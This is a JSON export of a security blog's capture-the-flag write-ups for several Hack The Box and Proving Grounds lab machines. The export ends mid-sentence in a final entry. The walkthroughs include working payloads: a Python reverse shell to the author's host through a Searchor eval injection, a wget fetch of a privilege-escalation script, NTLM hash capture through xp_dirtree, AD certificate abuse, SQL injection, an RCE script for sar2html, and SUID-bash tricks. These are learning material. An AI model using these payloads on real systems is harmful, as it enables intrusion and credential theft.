[{"content":"\u003c!DOCTYPE html\u003e Markmap ","permalink":"https://sy1.sh/writeups/htb-ambassador/","summary":"\u003c!DOCTYPE html\u003e Markmap ","title":"Hack The Box - Ambassador [Medium]"},{"content":"Here is a quick xmind map.\n","permalink":"https://sy1.sh/writeups/htb-irked/","summary":"Here is a quick xmind map.","title":"Hack The Box - Irked [Easy]"},{"content":"Here is a quick xmind map.\n","permalink":"https://sy1.sh/writeups/htb-joker/","summary":"Here is a quick xmind map.","title":"Hack The Box - Joker [Hard]"},{"content":"This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:\nPowered by Flask and Searchor 2.4.0 $ whatweb Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2] A simple google search would yield a bug that has been removed in Searchor 2.4.2+ and before that eval() was used in the Searchor CLI module. Assuming that the website uses that, we can send the following payload:\nPOST /search HTTP/1.1 Host: searcher.htb Content-Length: 67 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://searcher.htb Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://searcher.htb/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close engine=Accuweather\u0026amp;query=\u0026#39;,copy_url=__import__(\u0026#39;os\u0026#39;).system(\u0026#34;\u0026#34;\u0026#34; python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;\u0026lt;myip\u0026gt;\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;bash\u0026#34;)\u0026#39; \u0026#34;\u0026#34;\u0026#34;)) This would create a reverse shell to the machine.\nThe currently used user is svc upon running\n$ sudo -l We can see that we can use this command:\n$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \u0026lt;format\u0026gt; \u0026lt;container_name\u0026gt; $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup I also discovered the /opt/scripts folder that had some scripts inside, including full-checkup.sh, I\u0026rsquo;ve run the command in the /opt/scripts/ folder, and it successfully retrieved some information about the currently running services, I tried to run it in a different folder, and it gave me Something went wrong, I\u0026rsquo;ve created a dummy full-checkup.sh with chmod +s /bin/bash contents inside and ran the command again, it just printed out [+] Done and after that a simple bash -p gave me root user.\n$ cd /tmp \u0026amp;\u0026amp; wget http://\u0026lt;ip\u0026gt;:8000/full-checkup.sh \u0026amp;\u0026amp; chmod +x ./full-checkup.sh $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup $ bash -p $ cat /root/root.txt ","permalink":"https://sy1.sh/writeups/htb-busqueda/","summary":"This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:\nPowered by Flask and Searchor 2.4.0 $ whatweb Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2] A simple google search would yield a bug that has been removed in Searchor 2.","title":"Hack The Box - Busqueda [Easy]"},{"content":"This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I\u0026rsquo;ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.\nI am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!\nEnumerating I started with a simple nmap scan.\n$ nmap -Pn 10.10.11.202 PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Now since I am new to Active Directory I turned to https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb to check what I can try.\nEventually, after trying most of them, I landed on smbclient\n$ smbclient --no-pass -L 10.10.11.202 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Public Disk SYSVOL Disk Logon server share This is a list of shared folders, the one that we can take a look at is Public\n$ smbclient -N //10.10.11.202/Public Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Nov 19 06:51:25 2022 .. D 0 Sat Nov 19 06:51:25 2022 SQL Server Procedures.pdf A 49551 Fri Nov 18 08:39:43 2022 5184255 blocks of size 4096. 1276406 blocks available smb: \\\u0026gt; get \u0026#34;SQL Server Procedures.pdf\u0026#34; getting file \\SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (62.8 KiloBytes/sec) (average 62.8 KiloBytes/sec) Opening, the PDF states that we can use PublicUser:GuestUserCantWrite1 to log in to the SQL Server. We can use the impacket-mssqlclient which is a tool\n$ impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.11.202 Once I was in I started enumerating the database, looking at this and that, but I had no luck, I turned to some write-ups to follow up.\nNow most of the write-ups are just skipping the explanation of this step, but I think that it is really important to know what\u0026rsquo;s going on, so I will do my best to explain it.\nFollowing up this https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack attack, I tried the following thing:\nI checked if I can execute xp_dirtree:\nSQL\u0026gt; EXEC sp_helprotect \u0026#39;xp_dirtree\u0026#39;; Owner Object Grantee Grantor ProtectType Action Column ------ -------------------- ------------ ------- ----------- -------------- ------ sys xp_dirtree public dbo b\u0026#39;Grant \u0026#39; Execute . It turns out I can, so to capture the authentication hash, I need to set up an SMB server:\n# My Machine $ impacket-smbserver -smb2support smb ./smb And then to execute the xp_dirtree on the SQL Server\nSQL\u0026gt; exec master.dbo.xp_dirtree \u0026#39;\\\\\u0026lt;myIP\u0026gt;\\smb\u0026#39; Doing this would catch the AUTHENTICATE_MESSAGE, the user and the hash.\n$ impacket-smbserver -smb2support smb ./smb Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.11.202,52180) [*] AUTHENTICATE_MESSAGE (sequel\\sql_svc,DC) [*] User DC\\sql_svc authenticated successfully [*] sql_svc::sequel:aaaaaaaaaaaaaaaa:84e0a29415d2823f80593c9bc45d158c:010100000000000080fba2b8945ed9010f6267444f7024440000000001001000780056007a005000590061005000570003001000780056007a0050005900610050005700020010006c004f0054006f006f00540076007700040010006c004f0054006f006f005400760077000700080080fba2b8945ed90106000400020000000800300030000000000000000000000000300000c57e7de4e6e8e7baebb297a4bfc1a9019bc96f8f58ffbd9cb233cec428ece87f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100340032000000000000000000 Now I need to crack the hash, I won\u0026rsquo;t post the results here, so you have to figure that one on your own, it is simple enough! :)\nUsing the cracked password, I can log in using the evil-winrm\n$ evil-winrm --ip 10.10.11.202 --user sql_svc --password $(cat ./password) Now, we need to start enumerating again. I used winPEAS\n*Evil-WinRM* PS C:\\Users\\sql_svc\\Documents\u0026gt; upload /home/syl/tools/win/winPEASany.exe I eventually stumbled across interesting files and I\u0026rsquo;ve enumerated the users. The interesting file was C:\\SQLServer\\Logs\\ERRORLOG.BAK and upon further inspection I\u0026rsquo;ve got the password for the user Ryan.Cooper.\n$ evil-winrm --ip 10.10.11.202 --user Ryan.Cooper --password $(cat ./password ryan_password) ... *Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents\u0026gt; gc ../Desktop/user.txt \u0026lt;user_hash\u0026gt; Now I needed to escalate, I\u0026rsquo;ve used this guide for misconfigured certificates that cause AD CS Domain Escalation. https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation\nI\u0026rsquo;ve uploaded Certify to the SQL Server (user login) and tried to find vulnerable certificates.\nNOTE: Certify is a tool to enumerate and abuse misconfigured AD CS, you can find its source code here: https://github.com/GhostPack/Certify. Unfortunately(or fortunately) there aren\u0026rsquo;t any prebuilt binaries and you have to build it yourself. It is well explained in the README.\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents\u0026gt; ./Certify.exe find /vulnerable ... [!] Vulnerable Certificates Templates : CA Name : dc.sequel.htb\\sequel-DC-CA Template Name : UserAuthentication Schema Version : 2 Validity Period : 10 years Renewal Period : 6 weeks msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS Authorized Signatures Required : 0 With that tool, I found a vulnerable certificate that I can use to impersonate an administrator. Following up the attack on hacktricks:\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents\u0026gt; .\\Certify.exe request /ca:dc.sequel.htb\\sequel-DC-CA /template:UserAuthentication /altname:administrator ... CERTIFICATE ... [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP \u0026#34;Microsoft Enhanced Cryptographic Provider v1.0\u0026#34; -export -out cert.pfx I\u0026rsquo;ve downloaded the certificate on my machine and ran the command to convert it to pfx and I\u0026rsquo;ve uploaded it back to the server.\nUsing another tool called Rubeus that I\u0026rsquo;ve used to send raw request for a TGT towards the DC.\n$ ./Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /password:123 [*] Action: Ask TGT [*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb [*] Building AS-REQ (w/ PKINIT preauth) for: \u0026#39;sequel.htb\\administrator\u0026#39; [*] Using domain controller: fe80::5438:a078:e66d:b560%4:88 [+] TGT request successful! [*] base64(ticket.kirbi): ... [*] Getting credentials using U2U CredentialInfo : Version : 0 EncryptionType : rc4_hmac CredentialData : CredentialCount : 1 NTLM : \u0026lt;NTLM HASH\u0026gt; Now, that gave me the NTLM Hash, which is the cryptographic format in which user passwords are stored on Windows systems.\nI can use that with:\n$ evil-winrm -H \u0026#34;\u0026lt;NTLM HASH\u0026gt;\u0026#34; -u \u0026#34;administrator\u0026#34; -i 10.10.11.202 M* PS C:\\Users\\Administrator\\Documents\u0026gt; gc ../Desktop/root.txt \u0026lt;root_hash\u0026gt; References https://blog.zerospl0it.com/posts/Escape/ https://yu8pentest.blogspot.com/2023/02/escape.html https://medium.com/@Kushagra007/writeup-escape-hackthebox-dbee2d761d15 https://breached.vc/Thread-Escape-HTB-Discussion?highlight=escape ","permalink":"https://sy1.sh/writeups/htb-escape/","summary":"This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I\u0026rsquo;ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.\nI am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!","title":"Hack The Box - Escape [Medium]"},{"content":"The machine is labeled misleadingly easy, but that can lead you to miss stuff, so make sure to check everything!\nA simple nmap scan shows us that 8080 port is open.\nNmap scan report for 10.10.11.204 Host is up (0.13s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA) | 256 d51c81c97b076b1cc1b429254b52219f (ECDSA) |_ 256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519) 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Let\u0026rsquo;s start by simply inspecting the website that is running on port :8080.\nThe website seems like it has an upload form that we can upload images, my initial thought was LFI vulnerability, so I\u0026rsquo;ve checked it and I found it.\nhttp://10.10.11.204:8080/show_image?img=\u0026lt;vulnerable to LFI\u0026gt; Now I\u0026rsquo;ve wandered around exploring the website\u0026rsquo;s source code and after a bit of digging and searching I was on the verge of giving up. Since the machine is labeled easy, I didn\u0026rsquo;t exactly expect that the way to find a vulnerability is through https://spring.io/security/cve-2022-22963 (CVE-2022-22963) and I overlooked the versions that were listed in the maven build file (which you could exfiltrate from the LFI vulnerability).\nAfter that, a reverse shell using this https://github.com/lemmyz4n3771/CVE-2022-22963-PoC POC was easy-peasy.\nWhile enumerating the users, we can see that we have root, phil ,frank and a group that is called staff. So changing from frank to phil was through /home/frank/.m2/settings.xml which had the credentials to change the user to phil.\nYou can get your first flag after that.\nChanging to root was a bit tricky at first since I was trying to create a new playbook, which caused some errors and I finally decided to use the currently created one with the following payload.\n$ echo \u0026#39;[{hosts: localhost, tasks: [shell: /bin/sh \u0026lt;/dev/tty \u0026gt;/dev/tty 2\u0026gt;/dev/tty]}]\u0026#39; \u0026gt; ./playbook_1.yml \u0026lt;blabla\u0026gt; $ bash -p $ whoami root And there we have it!\n","permalink":"https://sy1.sh/writeups/htb-inject/","summary":"The machine is labeled misleadingly easy, but that can lead you to miss stuff, so make sure to check everything!\nA simple nmap scan shows us that 8080 port is open.\nNmap scan report for 10.10.11.204 Host is up (0.13s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA) | 256 d51c81c97b076b1cc1b429254b52219f (ECDSA) |_ 256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519) 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Let\u0026rsquo;s start by simply inspecting the website that is running on port :8080.","title":"Hack The Box - Inject [Easy]"},{"content":"So let\u0026rsquo;s start with a rustscan of the machine\nOpen 10.10.11.206:22 Open 10.10.11.206:80 Open 10.10.11.206:5789 [~] Starting Script(s) [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 14:37 EEST Initiating Ping Scan at 14:37 Scanning 10.10.11.206 [2 ports] Completed Ping Scan at 14:37, 0.05s elapsed (1 total hosts) Initiating Connect Scan at 14:37 Scanning qreader.htb (10.10.11.206) [3 ports] Discovered open port 22/tcp on 10.10.11.206 Discovered open port 80/tcp on 10.10.11.206 Discovered open port 5789/tcp on 10.10.11.206 Completed Connect Scan at 14:37, 0.05s elapsed (3 total ports) Nmap scan report for qreader.htb (10.10.11.206) Host is up, received syn-ack (0.050s latency). Scanned at 2023-04-21 14:37:19 EEST for 0s PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack 5789/tcp open unknown syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds I went to port 80 to check what is there, the idea of the website is to create QR Codes and extract text out of QR Codes, first I thought that maybe there is something with the QR codes but after some examination I decided to give up on that path and I went over the other things such as the Linux/Windows application.\nUpon further discovery using strings over the linux binary, I realized that this a packaged exectuable that was created with pyinstaller so I\u0026rsquo;ve tried to unpack it with uncompyle6 and then the pyc files with pycdc.\nI found out the following things from the source code of qreader:\n... VERSION = \u0026#39;0.0.2\u0026#39; ws_host = \u0026#39;ws://ws.qreader.htb:5789\u0026#39; ... def version(self): response = asyncio.run(ws_connect(ws_host + \u0026#39;/version\u0026#39;, json.dumps({ \u0026#39;version\u0026#39;: VERSION }))) data = json.loads(response) if \u0026#39;error\u0026#39; not in data.keys(): version_info = data[\u0026#39;message\u0026#39;] msg = f\u0026#39;\u0026#39;\u0026#39;[INFO] You have version {version_info[\u0026#39;version\u0026#39;]} which was released on {version_info[\u0026#39;released_date\u0026#39;]}\u0026#39;\u0026#39;\u0026#39; self.statusBar().showMessage(msg) return None error = None[\u0026#39;error\u0026#39;] self.statusBar().showMessage(error) def update(self): response = asyncio.run(ws_connect(ws_host + \u0026#39;/update\u0026#39;, json.dumps({ \u0026#39;version\u0026#39;: VERSION }))) data = json.loads(response) if \u0026#39;error\u0026#39; not in data.keys(): msg = \u0026#39;[INFO] \u0026#39; + data[\u0026#39;message\u0026#39;] self.statusBar().showMessage(msg) return None error = None[\u0026#39;error\u0026#39;] self.statusBar().showMessage(error) This source code tries to connect to a websocket to get its version/update, so the paths for the websockets are:\nws://ws.qreader.htb:5789/update ws://ws.qreader.htb:5789/version I\u0026rsquo;ve tested both of these with claws tool. Then I crafted a python script to connect with the socket.\nWARNING: Be really careful which quotes you are using, ' or \u0026quot; because that could interfere with the SQLi that I found in the version path!\nfrom websockets.sync.client import connect import json with connect(\u0026#34;ws://ws.qreader.htb:5789/version\u0026#34;) as websocket: websocket.send(json.dumps({\u0026#39;version\u0026#39;: \u0026#39;0.0.3\u0026#34; UNION SELECT group_concat(answer),2,3,4 from answers-- -\u0026#39;})) m = websocket.recv() print(m) With this script, I\u0026rsquo;ve enumerated the tables, columns and the username with the following payloads:\n\u0026#39;0.0.3\u0026#34; UNION SELECT group_concat(answer),2,3,4 from answers-- -\u0026#39; -\u0026gt; This finds the user Thomas Keller \u0026#39;0.0.3\u0026#34; UNION SELECT group_concat(password),2,3,4 from users-- -\u0026#39; -\u0026gt; This find the password hash Cracking the password\n$ hashcat -m 0 -a 0 0c090c365fa0559b151a43e0fea39710 ~/tools/rockyou.txt \u0026lt;PASSWORD\u0026gt; Getting the username with adusergen\n$ echo -n \u0026#34;Thomas Keller\u0026#34; | adusergen Thomas.Keller ThomasKeller KellerThomas Keller.Thomas Tkeller T.keller Thomas-Keller T.keller thomas.keller thomaskeller kellerthomas keller.thomas tkeller \u0026lt;--- Right One t.keller thomas-keller t.keller Root The root was fairly easy, you just have to read the documentation for spec files for pyinstaller, after that I crafted the following spec file:\nblock_cipher = __import__(\u0026#39;os\u0026#39;).system(\u0026#39;chmod +s /bin/bash\u0026#39;) tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build priv.spec 105 INFO: PyInstaller: 5.6.2 105 INFO: Python: 3.10.6 107 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35 110 INFO: UPX is not available. script \u0026#39;/home/tkeller/minimal.py\u0026#39; not found tkeller@socket:~$ /bin/bash -p bash-5.1# whoami root bash-5.1# cat /root/root.txt \u0026lt;HASH\u0026gt; ","permalink":"https://sy1.sh/writeups/htb-socket/","summary":"So let\u0026rsquo;s start with a rustscan of the machine\nOpen 10.10.11.206:22 Open 10.10.11.206:80 Open 10.10.11.206:5789 [~] Starting Script(s) [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 14:37 EEST Initiating Ping Scan at 14:37 Scanning 10.10.11.206 [2 ports] Completed Ping Scan at 14:37, 0.05s elapsed (1 total hosts) Initiating Connect Scan at 14:37 Scanning qreader.htb (10.10.11.206) [3 ports] Discovered open port 22/tcp on 10.10.11.206 Discovered open port 80/tcp on 10.10.11.206 Discovered open port 5789/tcp on 10.","title":"Hack The Box - Socket [Medium]"},{"content":"This was a fairly easy machine, I began with a nmap scan:\nPORT STATE SERVICE 22/tcp open ssh 80/tcp open http On port 80 there was a blank website, so I fuzz it and found bunch of files.\nhttp://192.168.210.35/robots.txt -\u0026gt; http://192.168.210.35/sar2HTML/ http://192.168.210.35/phpinfo.php Using the phpinfo I have enumerated the versions\nsar2html Ver 3.2.1 \u0026lt;-- Vulnerable Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 Apache/2.4.29 PHP 7.1.32-1+ubuntu18.04.1+deb.sury.org+1 exif 7.1.32-1+ubuntu18.04.1+deb.sury.org+1 - JPEG,TIFF mysqlnd 5.0.12-dev - 20150407 Net_SFTP_Stream 0.3.2 SFTP Stream Wrapper sar2html Was vulnerable to RCE, and I\u0026rsquo;ve created a python script to exploit it further.\nimport bs4 import requests url = \u0026#34;http://\u0026lt;ip\u0026gt;/sar2HTML/index.php?plot=;\u0026#34; while True: command = input(\u0026#34;$ \u0026#34;) if command == \u0026#34;exit\u0026#34;: break else: response = requests.get(url + command.replace(\u0026#34; \u0026#34;, \u0026#34;%20\u0026#34;)) html = response.text soup = bs4.BeautifulSoup(html, \u0026#34;html.parser\u0026#34;) sel_tag = soup.find(\u0026#34;select\u0026#34;, {\u0026#34;class\u0026#34;: \u0026#34;select_text\u0026#34;}).children for c in sel_tag: if c.text == \u0026#34;Select Host\u0026#34;: continue if c.text == \u0026#34;There is no defined host...\u0026#34;: continue print(c.text) Using this script, you can read the user/local.txt file to get the first flag.\nI then run the linpeas script to check how to privilege escalation, I\u0026rsquo;ve noticed that there was a cron job that was running on the *.sh files in the /var/www/html folder:\n*/5 * * * * root cd /var/www/html/ \u0026amp;\u0026amp; sudo ./finally.sh finally.sh is actually calling write.sh which is writable by the www-data\n-rwxrwxrwx 1 www-data www-data 55 Mar 5 15:32 write.sh I\u0026rsquo;ve used the following script to get the root proof.txt\n# write.sh cat /root/proof.txt \u0026gt; /var/www/html/hash.txt Then I waited 5m to get the flag, I\u0026rsquo;ve done it this way since I got problems setting up the reverse shell, nonetheless I got root.\n","permalink":"https://sy1.sh/writeups/pg-sar/","summary":"This was a fairly easy machine, I began with a nmap scan:\nPORT STATE SERVICE 22/tcp open ssh 80/tcp open http On port 80 there was a blank website, so I fuzz it and found bunch of files.\nhttp://192.168.210.35/robots.txt -\u0026gt; http://192.168.210.35/sar2HTML/ http://192.168.210.35/phpinfo.php Using the phpinfo I have enumerated the versions\nsar2html Ver 3.2.1 \u0026lt;-- Vulnerable Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 Apache/2.4.29 PHP 7.1.32-1+ubuntu18.04.1+deb.sury.org+1 exif 7.","title":"Proving Grounds (OSCP) - Sar"},{"content":"I\u0026rsquo;ve started my OSCP journey a while ago, and I wanted to try the PG machines, this is the first one that I\u0026rsquo;ve tried. The machine is fairly straightforward and it\u0026rsquo;s labeled easy.\nI\u0026rsquo;ve started with a simple nmap scan, which hinted that this Linux machine is part of an Active Directory.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 414daa1886948e88a74c6b426076f14f (RSA) | 256 4da3d07a8f64ef82452d011318b7e013 (ECDSA) |_ 256 1a017a4fcf9585bf31a14f1587ab94e2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Photographer by v1n1v131r4 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 8000/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: daisa ahomi |_http-generator: Koken 0.22.24 Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel On the port 80 we have a simple web page which is more or less just a placeholder of a template, but on the 8000 we have a functional website build with Koken\n# Versions for :80 http://192.168.160.76:80/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.160.76], JQuery, Script, Title[Photographer by v1n1v131r4] # Versions for :8000 http://192.168.160.76:8000/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.160.76], JQuery[1.12.4], Meta-Author[daisa ahomi], MetaGenerator[Koken 0.22.24], Script, Title[daisa ahomi], X-UA-Compatible[IE=edge] I immediately searched for exploits for Koken 0.22.24, and found this one: https://www.exploit-db.com/exploits/48706\nThis is authenticated exploit, so it hinted that I must look further to get some credentials.\nUpon scanning the Active Directory (139,445) I found public shares, one of which was non-default sambashare.\n$ smbclient -N -L 192.168.160.76 Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers sambashare Disk Samba on Ubuntu IPC$ IPC IPC Service (photographer server (Samba, Ubuntu)) I explored it and found 2 files, one was an email in a txt format and the other one was zipped WordPress site, I\u0026rsquo;ve scanned the WordPress source code with gf (https://github.com/tomnomnom/gf) but found nothing. The mail thought had an interesting text inside that hinted two users and suggestion for a password.\nagi@photographer.com - Agi Clarence daisa@photographer.com - Daisa Ahomi I found the password for the user daisa@photographer.com in the content of the mail. (It is very simple!)\nAfter that, I logged into the Koken's Admin Panel and uploaded a simple PHP shell using the previously mentioned exploit. I could read the user/local.txt file that yielded the user own flag.\nThe root was pretty straightforward, upon scanning for SUID binaries, I found that /usr/bin/php7.2 was such, and a simple request with the previous active shell yielded me the root flag.\nGET /storage/originals/4f/38/image.php?cmd=/usr/bin/php7.2+-r+\u0026#39;readfile(\u0026#34;/root/proof.txt\u0026#34;)%3b\u0026#39; HTTP/1.1 Host: 192.168.210.76:8000 Upgrade-Insecure-Requests: 1 User-Agent: ... Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: koken_session_ci=... Connection: close ","permalink":"https://sy1.sh/writeups/pg-photographer/","summary":"I\u0026rsquo;ve started my OSCP journey a while ago, and I wanted to try the PG machines, this is the first one that I\u0026rsquo;ve tried. The machine is fairly straightforward and it\u0026rsquo;s labeled easy.\nI\u0026rsquo;ve started with a simple nmap scan, which hinted that this Linux machine is part of an Active Directory.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 414daa1886948e88a74c6b426076f14f (RSA) | 256 4da3d07a8f64ef82452d011318b7e013 (ECDSA) |_ 256 1a017a4fcf9585bf31a14f1587ab94e2 (ED25519) 80/tcp open http Apache httpd 2.","title":"Proving Grounds (OSCP) - Photographer"},{"content":"This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.\nYou will find the following vulnerabilities: - Local File Inclusion - Command Injection or RCE\nFlag 1 I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on. But the interesting part was this:\nIf required, you can specify a URL that will return data to be converted with the file_url parameter. This can be done for both string and integer convertions.\nThat quickly reminded me of local/remote file inclusion, and so I\u0026rsquo;ve tried it with the following payload:\njson_data = { \u0026#39;action\u0026#39;: \u0026#39;b64encode\u0026#39;, \u0026#39;file_url\u0026#39; : \u0026#39;file:///etc/passwd\u0026#39; } That gave me the contents of the /etc/passwd file encoded in base64, I used base64 -d to decode it. From there I saw another user svc.\nI was also curious what\u0026rsquo;s in the /var/www/ directory, so I began enumerating the directory.\nI ran ffuf on the main website haxtables.htb/FUZZ also ran ffuf for subdomain discovery.\n$ ffuf -w $disc_wc/raft-small-directories-lowercase.txt -u http://haxtables.htb/FUZZ $ ffuf -w $disc_wc/common.txt -u http://haxtables.htb/ -H \u0026#34;Host: FUZZ.haxtables.htb\u0026#34; -fs 1999 With those I found api, image subdomains, so I inspected them via the LFI vulnerability /var/www/image/index.php to check whether this application uses some kind of database or eventually some useful things. I found that image domain contains a git repository (through git_status, git_log, git_commit functions in /var/www/image/index.php -\u0026gt; uitls.php). This led me to believe that I could use that to gain user privileges later on. I decided to dump the repository and bear with me here I did it in the most ghetto way possible, through a local server that acted as a proxy for gitdumper.sh\nimport requests import json from flask import Flask import base64 app = Flask(__name__) @app.route(\u0026#39;/\u0026lt;path:filepath\u0026gt;\u0026#39;) def index(filepath): json_data = { \u0026#39;action\u0026#39;: \u0026#39;b64encode\u0026#39;, \u0026#39;file_url\u0026#39; : \u0026#34;file://\u0026#34; + \u0026#34;/var/www/image/\u0026#34; + filepath } response = requests.post(\u0026#39;http://api.haxtables.htb/v3/tools/string/index.php\u0026#39;, json=json_data) d = json.loads(response.text.strip()) res = base64.b64decode(d[\u0026#34;data\u0026#34;]) return res $ gitdumper.sh http://localhost:5000/.git/ ./dump_repo Then I used the git ls-files to figure what other files are in the folder.\n$ git ls-files actions/action_handler.php actions/image2pdf.php assets/img/forestbridge.jpg includes/coming_soon.html index.php scripts/git-commit.sh utils.php I saw the actions/action_handler.php source code by using the LFI vulnerability.\n\u0026lt;?php include_once \u0026#39;utils.php\u0026#39;; if (isset($_GET[\u0026#39;page\u0026#39;])) { $page = $_GET[\u0026#39;page\u0026#39;]; include($page); # \u0026lt;-- BruhMoment } else { echo jsonify([\u0026#39;message\u0026#39; =\u0026gt; \u0026#39;No page specified!\u0026#39;]); } ?\u0026gt; It is pretty obvious that this code is vulnerable to LFI, and I can use it to gain a reverse shell through PHP Filters. But I can\u0026rsquo;t access this page directly, so I can use the first LFI to execute this LFI to execute the PHP filters RCE\u0026hellip;\nAnd this is me figuring out this after 2 days of trying\u0026hellip;\nI generated a payload with the PHP filter chain 